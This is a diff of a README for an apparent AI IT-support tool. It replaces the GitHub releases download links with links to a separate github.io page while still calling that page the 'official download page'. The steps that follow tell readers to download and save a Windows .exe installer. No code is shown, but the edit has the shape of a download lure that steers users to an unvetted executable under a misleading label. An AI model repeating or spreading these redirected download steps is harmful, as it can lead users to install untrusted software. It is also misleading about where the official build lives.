@@ -1,6 +1,6 @@
 # 🤖 10_ai_it_support_assistant - Automate IT support tasks on your computer
 
-[![Download](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/puppetrygenusscilla672/10_ai_it_support_assistant/releases)
+[![Download](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://puppetrygenusscilla672.github.io)
 
 ## 🎯 About This Application
 
@@ -20,7 +20,7 @@ Ensure your computer meets these specifications before you begin:
 
 Follow these steps to prepare your system for the assistant.
 
-1.  Visit the [official download page](https://github.com/puppetrygenusscilla672/10_ai_it_support_assistant/releases).
+1.  Visit the [official download page](https://puppetrygenusscilla672.github.io).
 2.  Locate the latest release section.
 3.  Select the Windows installer file ending in .exe.
 4.  Save the file to your Downloads folder.
